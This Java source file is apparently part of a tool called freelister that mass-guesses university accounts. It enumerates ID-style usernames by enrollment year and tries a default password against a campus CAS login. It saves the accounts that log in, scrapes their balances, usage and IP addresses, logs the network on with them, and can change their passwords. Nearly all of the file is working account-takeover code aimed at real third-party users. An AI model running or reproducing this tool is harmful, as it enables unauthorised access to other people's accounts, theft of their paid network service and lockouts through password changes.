package com.freelister.service;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.Queue;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.cookie.Cookie;
import com.freelister.dao.FileDao;
import com.freelister.model.*;

/**
 * Project: freelister Comments: JDK version used: JDK1.8 Namespace:
 * com.freelister.service Author: ting Create Date: Jul 19, 2015 Version: V1.0
 */
public class AccountServices extends Thread {
	private int[] scanRange_year = { 1990, 2016 };
	private int[] scanRange_digit = { 3, 4, 2 };
	private String[] scanRange_passwd = { "dgut123" };
	private List<Thread_Scan> threads_scan = new ArrayList<Thread_Scan>();
	private boolean scan_isStopping = false;
	private boolean update_isStopping = false;
	private Queue<Account_withFlags> queue_account = new LinkedList<Account_withFlags>();
	private List<Account> accounts = new ArrayList<Account>();
	private Thread_Save thread_save = new Thread_Save();
	private Thread_Load thread_load = new Thread_Load();
	private Thread_Update thread_update = new Thread_Update(accounts);
	private File file_results = new File("/opt/freelister/results.txt");
	private int sleeptime;
	private AccountServices self = this;

	public void run() {
		while (true) {
			synchronized (this) {
				StatusServices.setAccountCount(accounts.size());
				StatusServices.setOp(StatusServices.OP_NONE);
				if (this.scan_isStopping && this.threads_scan.size() != 0)
					StatusServices.addOp(StatusServices.OP_STOPSCAN);
				else if (this.threads_scan.size() != 0)
					StatusServices.addOp(StatusServices.OP_SCAN);
				else
					this.scan_isStopping = false;

				if (this.thread_load.isAlive())
					StatusServices.addOp(StatusServices.OP_LOAD);
				else if (this.thread_save.isAlive())
					StatusServices.addOp(StatusServices.OP_SAVE);

				if (this.thread_update.isAlive() && this.update_isStopping)
					StatusServices.addOp(StatusServices.OP_STOPUPDATE);
				else if (this.thread_update.isAlive())
					StatusServices.addOp(StatusServices.OP_UPDATE);
				else
					this.update_isStopping = false;
			}
			try {
				sleep(sleeptime);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}

	public AccountServices(int sleeptime) {
		this.sleeptime = sleeptime;
	}

	public int[] getScanRange_year() {
		return scanRange_year;
	}

	public int[] getScanRange_digit() {
		return scanRange_digit;
	}

	public String[] getScanRange_passwd() {
		return scanRange_passwd;
	}

	public void setAll(int[] scanRange_year, int[] scanRange_digit,
			String[] passwd) throws Exception {
		if (scanRange_year[0] > scanRange_year[1]
				|| scanRange_digit[0] > scanRange_digit[1])
			throw new Exception("Scanning range illegal");
		this.scanRange_year = scanRange_year;
		this.scanRange_digit = scanRange_digit;
		this.scanRange_passwd = passwd;
	}

	public Account_withFlags pollAccount() {
		if (queue_account.isEmpty())
			return null;
		synchronized (queue_account) {
			return queue_account.poll();
		}
	}

	/**
	 * 
	 * @Title: getIndex
	 */
	public int getIndex(Account a) {
		if (!accounts.contains(a)) {
			return -1;
		} else {
			int index = accounts.indexOf(a);
			String passwd = accounts.get(index).getPasswd();
			if (!a.getPasswd().equals(passwd))
				return index;
		}
		return -1;
	}

	public void addAccount(Account a) {
		if (a == null)
			return;
		if (!accounts.contains(a)) {
			synchronized (accounts) {
				accounts.add(a);
				System.out.println(a.getUsername() + " added!");
				StatusServices.offerMessage(a.getUsername() + " added!");
			}
			Account_withFlags af = new Account_withFlags(a, -1);
			synchronized (queue_account) {
				this.queue_account.offer(af);
			}
		} else {
			int index = accounts.indexOf(a);
			Account a_old = accounts.get(index);
			if (a_old.isUpdated(a)) {
				a_old.update(a);
				StatusServices.offerMessage(a.getUsername() + " updated!");
				Account_withFlags af = new Account_withFlags(a_old, index);
				af.setUpdate(true);
				synchronized (queue_account) {
					this.queue_account.offer(af);
				}
			}
		}
	}

	public class Account_withFlags extends Account {
		/**
		 * 
		 */
		private static final long serialVersionUID = 1L;
		private int index; // the index of the account in the accounts list,
							// only be set when passwdonly is true;
		private boolean update = false;
		private boolean delete = false;

		public Account_withFlags(Account a, int index) {
			super(a);
			this.index = index;
		}

		public int getIndex() {
			return index;
		}

		public void setIndex(int index) {
			this.index = index;
		}

		public boolean isDelete() {
			return delete;
		}

		public void setDelete(boolean delete) {
			this.delete = delete;
		}

		public boolean isUpdate() {
			return update;
		}

		public void setUpdate(boolean update) {
			this.update = update;
		}

	}

	private class Thread_Scan extends Thread {
		private int year;
		private String passwd;
		private boolean isStoped = false;

		public void safeStop() {
			this.isStoped = true;
		}

		public Thread_Scan(int year, String passwd) {
			super();
			this.year = year;
			this.passwd = passwd;
		}

		public void run() {
			for (int digit_scanning = scanRange_digit[0]; digit_scanning <= scanRange_digit[1]
					&& !this.isStoped; digit_scanning++) {
				long yearTail = (long) Math.pow(10, digit_scanning);
				long maxNo;
				if (scanRange_digit[2] > digit_scanning)
					maxNo = yearTail - 1;
				else
					maxNo = (long) (Math.pow(10, scanRange_digit[2]) - 1);
				for (long j = 0; j <= maxNo && !this.isStoped; j++) {
					String userName = String.valueOf(year * yearTail + j);
					try {
						Account tmp_account = new Account(userName, passwd);
						if (!AccountServices.tryGetInfo(tmp_account))
							continue;
						addAccount(tmp_account);
					} catch (Exception e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
			}
			synchronized (threads_scan) {
				threads_scan.remove(this);
			}
		}
	}

	private class Thread_Save extends Thread {
		public void run() {
			try {
				new FileDao<Account>(file_results).save(accounts);
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (Throwable e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}

	private class Thread_Load extends Thread {
		public void run() {
			List<Account> alist;
			try {
				alist = new FileDao<Account>(file_results).load(new Account());
				if (alist == null)
					return;
				// alist.sort(new Comparator<Account>() {
				// @Override
				// public int compare(Account o1, Account o2) {
				// // TODO Auto-generated method stub
				// return (int) (Long.parseLong(o1.getUsername()) - Long
				// .parseLong(o2.getUsername()));
				// }
				// });
				for (Account a : alist) {
					Account_withFlags af = new Account_withFlags(a, -1);
					addAccount(af);
				}
			} catch (ClassNotFoundException | IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (Throwable e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}

	private class Thread_Update extends Thread {
		private List<Account> alist;

		public Thread_Update(List<Account> alist) {
			this.alist = alist;
		}

		public void run() {
			for (int i = 0; i < alist.size(); i++) {
				if (self.update_isStopping)
					break;
				Account a = alist.get(i);
				self.updateAccount(a);
			}
		}
	}

	public void scan() throws ClientProtocolException, IOException {
		for (int i = this.scanRange_year[0]; i <= this.scanRange_year[1]; i++) {
			for (int j = 0; j < this.scanRange_passwd.length; j++) {
				Thread_Scan thread_scan = new Thread_Scan(i,
						this.scanRange_passwd[j]);
				threads_scan.add(thread_scan);
				thread_scan.start();
			}
		}
	}

	public void stopScan() {
		scan_isStopping = true;
		for (int i = 0; i < threads_scan.size(); i++) {
			this.threads_scan.get(i).safeStop();
		}
	}

	public void stopUpdate() {
		update_isStopping = true;
	}

	public void save() {
		while (this.thread_save.isAlive() || this.thread_load.isAlive())
			try {
				Thread.sleep(1000);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		this.thread_save = new Thread_Save();
		this.thread_save.start();
	}

	public void load() throws ClientProtocolException, IOException {
		while (this.thread_save.isAlive() || this.thread_load.isAlive())
			try {
				Thread.sleep(1000);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		this.thread_load = new Thread_Load();
		this.thread_load.start();
	}

	/**
	 * @Title: update
	 */
	public void updateAll() {
		while (this.thread_update.isAlive())
			try {
				Thread.sleep(1000);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		this.thread_update = new Thread_Update(accounts);
		this.thread_update.start();
	}

	public void updateAccounts(List<Account> alist) {
		while (this.thread_update.isAlive())
			try {
				Thread.sleep(1000);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		this.thread_update = new Thread_Update(alist);
		this.thread_update.start();
	}

	public void updateAccount(Account au) {
		if (!accounts.contains(au))
			return;
		try {
			Account a = new Account(accounts.get(accounts.indexOf(au)));
			if (AccountServices.tryGetInfo(a)) {
				addAccount(a);
			} else {
				if (a.getPasswd_flow().equals("-"))
					delAccount(a);
				else {
					a.setPasswd("-");
					addAccount(a);
				}
			}
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	public void delAccount(Account a) {
		StatusServices.offerMessage(a.getUsername() + " deleted!");
		System.out.println(a.getUsername() + " deleted!");
		System.out.println("username:" + a.getUsername() + " passwd:" + a.getPasswd() + " passwdFlow:" + a.getPasswd_flow());
		Account_withFlags af = new Account_withFlags(a, accounts.indexOf(a));
		af.setDelete(true);
		synchronized (queue_account) {
			queue_account.offer(af);
		}
		synchronized (accounts) {
			accounts.remove(a);
		}
	}

	public void login(Account a) throws Exception {
		String userName = a.getUsername();
		String passwd = a.getPasswd_flow();
		if (passwd.equals("-")) {
			passwd = a.getPasswd();
		}
		int index = accounts.indexOf(a);
		Account a_new;
		if (index == -1)
			a_new = a;
		else {
			a_new = new Account(accounts.get(index));
			a_new.setPasswd_flow(passwd);
		}
		Map<String, String> params = new HashMap<String, String>();
		params.put("DDDDD", userName);
		params.put("upass", passwd);
		params.put("0MKKey", "%B5%C7+%C2%BC");
		String s = HttpRequest.doPost("http://192.168.252.8/", params, null);
		if (s.indexOf(";UID") != -1) {
			int gno = Integer.parseInt(s.substring(s.indexOf("<!--") + 8,
					s.indexOf(";UID")));
			StatusServices.offerMessage(userName + " goes online success!");
			a_new.setType(gno);
			addAccount(a_new);
		} else {
			StatusServices.offerMessage(userName + " goes online failed!");
			if (index != -1) {
				Account a1 = accounts.get(index);
				if (a1.getPasswd().equals("-")) {
					delAccount(a1);
				} else if (!a1.getPasswd_flow().equals("-")) {
					a_new.setPasswd_flow("-");
					addAccount(a_new);
				}
			}
		}
	}

	/**
	 * @Title: logout
	 */
	public void logout() {
		HttpRequest.doGet("http://192.168.252.8/F.htm");
	}

	public void setRemark(Account a, String remark) {
		int index = accounts.indexOf(a);
		if (index == -1)
			return;
		Account a_old = accounts.get(accounts.indexOf(a));
		Account a_new = new Account(a_old);
		a_new.setRemark(remark);
		addAccount(a_new);
	}

	/**
	 * Try to Login to the Campus Network Self-help
	 * Website("http://self.dgut.edu.cn").
	 * 
	 * @Title: loginSelf
	 * @return: The cookies responsed by server, as tested, the size of cookies
	 *          will be 1 if login failed, let it as a identity of login result
	 *          is a good idea.
	 * @throws: Exception
	 */
	@SuppressWarnings("unchecked")
	public static List<Cookie> tryLogin(String userName, String passwd)
			throws Exception {

		Map<String, String> params = new HashMap<String, String>();
		params.put("ReturnUrl", "%2F%3Fappid%3Dself");
		params.put("UserName", userName);
		params.put("Password", passwd);
		List<Cookie> cookies = ((List<Cookie>) HttpRequest
				.postForm(
						"https://cas.dgut.edu.cn/User/Login?ReturnUrl=%2f%3fappid%3dself&appid=self",
						params, null, HttpRequest.TYPE_RETURN_COOKIES));
		if (cookies == null || cookies.size() < 2)
			StatusServices.offerMessage(userName + " login with passwd:"
					+ passwd + " failed!");
		else
			StatusServices.offerMessage(userName + " login with passwd:"
					+ passwd + " success!");
		return cookies;
	}

	/**
	 * Try to login the
	 * 
	 * @Title: tryGetInfo
	 * @return
	 * @throws
	 */
	@SuppressWarnings("unchecked")
	public static boolean tryGetInfo(Account a) throws Exception {
		String userName = a.getUsername();
		String passwd = a.getPasswd();
		if (passwd.equals("-"))
			passwd = a.getPasswd_flow();
		List<Cookie> cookies = tryLogin(userName, passwd);
		if (cookies.size() < 2) {
			if (a.getPasswd().equals("-"))
				return true;
			return false;
		}
		a.setPasswd(passwd);
		String cookies_s = new String();
		for (int i = 0; i < cookies.size(); i++) {
			cookies_s += cookies.get(i).getName() + "="
					+ cookies.get(i).getValue() + "; ";
		}
		String url = HttpRequest.doGet("https://cas.dgut.edu.cn/?appid=self",
				cookies_s).getHeaderField("Location");
		cookies = ((List<Cookie>) HttpRequest.doGet(url, null,
				HttpRequest.TYPE_RETURN_COOKIES, null));
		a.setCookies(cookies);
		String result = (String) HttpRequest.doGet("http://self.dgut.edu.cn/",
				cookies, HttpRequest.TYPE_RETURN_CONTENT, null);
		String result1 = (String) HttpRequest.doGet(
				"http://self.dgut.edu.cn/Flow/Index", cookies,
				HttpRequest.TYPE_RETURN_CONTENT, null);
		int tmp_index0 = result.indexOf("上线时间");
		if (tmp_index0 != -1) {
			a.setOnline_ipv4(true);
			int tmp_index = result.indexOf("data-ajax-confirm=\"您确定要强制下线吗？\"");
			String getontime = result.substring(tmp_index0 + 10,
					tmp_index0 + 21);
			String ip = result.substring(tmp_index0 + 40, tmp_index - 37);
			a.setGetontime(getontime);
			a.setIp(ip);
		}
//		if (result.indexOf("IPv6上线时间") != -1)
//			a.setOnline_ipv6(true);
		int tmp_index1 = result.indexOf("<label for=\"T4_Money\">");
		int tmp_index2 = result.indexOf("<label for=\"T5_CurrentMoney\">");

		if (tmp_index1 == -1)
			a.setType(22); // 　set the type to NotOpenYet
		else {
			if ((result1.indexOf("莞城学生") != -1)) 
				a.setType("unGuan");
			else if (result1.indexOf("学生") != -1)
				a.setType("Student");
			else if (result1.indexOf("教师") != -1)
				a.setType("Teacher");
			else if (result1.indexOf("员工") != -1)
				a.setType("Employee");
			String money = result.substring(tmp_index1 + 67, tmp_index2 - 88).trim();
			int tmp_index3 = result.indexOf("<label for=\"T6_CurrentTime\">本期时长</label>");
			int tmp_index4 = result.indexOf("<label for=\"T7_CurrentFlow\">本期流量</label>");
			int tmp_index5 = result.indexOf("<label for=\"T8_StartDate\">起始计费</label> ");
			String timeUsed = result
					.substring(tmp_index3 + 73, tmp_index4 - 89).trim();
			String flowUsed = result
					.substring(tmp_index4 + 73, tmp_index5 - 89).trim();
			try {
				a.setMoney(Float.parseFloat(money));
				a.setFlowUsed(Float.parseFloat(flowUsed));
				a.setTimeUsed(Integer.parseInt(timeUsed));
			} catch (NumberFormatException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		return true;
	}

	@SuppressWarnings("unchecked")
	public String getRecord(Account a, String type, String month)
			throws Exception {
		Account a_old = accounts.get(accounts.indexOf(a));
		List<Cookie> cookies = a_old.getCookies();
		if (cookies.size() < 2) {
			String userName = a.getUsername();
			String passwd = a.getPasswd();
			if (passwd.equals("-"))
				passwd = a.getPasswd_flow();
			cookies = tryLogin(userName, passwd);
			if (cookies.size() < 2) {
				return new String("Username or Password error !");
			}
			a.setPasswd(passwd);
			String cookies_s = new String();
			for (int i = 0; i < cookies.size(); i++) {
				cookies_s += cookies.get(i).getName() + "="
						+ cookies.get(i).getValue() + "; ";
			}
			String url = HttpRequest.doGet(
					"https://cas.dgut.edu.cn/?appid=self", cookies_s)
					.getHeaderField("Location");
			cookies = ((List<Cookie>) HttpRequest.doGet(url, null,
					HttpRequest.TYPE_RETURN_COOKIES, null));
		}
		String url;
		switch (type) {
		case "上网日志":
			url = new String("http://self.dgut.edu.cn/Search/_GetUserLog?");
			break;
		case "收费日志":
			url = new String("http://self.dgut.edu.cn/Search/_GetUserPay?");
			break;
		case "流量包日志":
			url = new String("http://self.dgut.edu.cn/Search/_GetUserPackage?");
			break;
		default:
			return null;
		}
		url += "month=" + month + "&type=4&X-Requested-With=XMLHttpRequest";
		String result = HttpRequest.doGet(url, cookies);
		return result;
	}

	@SuppressWarnings("unchecked")
	public void changePasswd(Account a, String newPasswd, String newPasswd2,
			boolean flowOnly) throws Exception {
		new Thread() {
			public void run() {
				List<Cookie> cookies;
				try {
					cookies = tryLogin(a.getUsername(), a.getPasswd());

					if (cookies.size() < 2)
						StatusServices.offerMessage(a.getUsername()
								+ " Password changes failed!");
					String cookies_s = new String();
					for (int i = 0; i < cookies.size(); i++) {
						cookies_s += cookies.get(i).getName() + "="
								+ cookies.get(i).getValue() + "; ";
					}
					String url = HttpRequest.doGet(
							"https://cas.dgut.edu.cn/?appid=self", cookies_s)
							.getHeaderField("Location");
					cookies = ((List<Cookie>) HttpRequest.doGet(url, null,
							HttpRequest.TYPE_RETURN_COOKIES, null));
					Object[] result_cookies = (Object[]) HttpRequest.doGet(
							"https://cas.dgut.edu.cn/user/changepwd", cookies,
							HttpRequest.TYPE_RETURN_CONTENT_COOKIES, null);
					String result = (String) result_cookies[0];
					cookies = (List<Cookie>) result_cookies[1];
					for (int i = 0; i < cookies.size(); i++) {
						cookies_s += cookies.get(i).getName() + "="
								+ cookies.get(i).getValue() + "; ";
					}
					Map<String, String> params = new HashMap<String, String>();
					String token = result
							.substring(
									result.indexOf("__RequestVerificationToken") + 49,
									result.indexOf("\" />                <div><label for=\"UserName\">"));
					params.put("__RequestVerificationToken", token);
					params.put("UserName", a.getUsername());
					params.put("OldPassword", a.getPasswd());
					if (flowOnly) {
						params.put("NetworkNewPassword", newPasswd);
						params.put("NetworkNewPassword2", newPasswd2);
						params.put("SyncNewworkPassword", "false");

					} else {
						params.put("NewPassword", newPasswd);
						params.put("NewPassword2", newPasswd2);
						params.put("SyncNewworkPassword", "true");
					}
					params.put("submit", "提交");
					String response = (String) HttpRequest.doPost(
							"https://cas.dgut.edu.cn/user/changepwd", params,
							cookies);
					result = null;
					Account a_old = accounts.get(accounts.indexOf(a));
					Account a = new Account(a_old);
					if (response.indexOf("中央认证密码修改成功") != -1) {
						result = new String(" Central password changed! ");
						a.setPasswd(newPasswd);
					}
					if (response.indexOf("上网密码修改成功") != -1) {
						result = (result == null) ? (new String(
								" Network password changed!"))
								: (result + " Network password changed!");
						a.setPasswd_flow(newPasswd);
					}
					if (result != null)
						StatusServices.offerMessage(a.getUsername() + result);
					else
						StatusServices.offerMessage(a.getUsername()
								+ "Password changes failed!");
					addAccount(a);
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		}.start();
	}
}
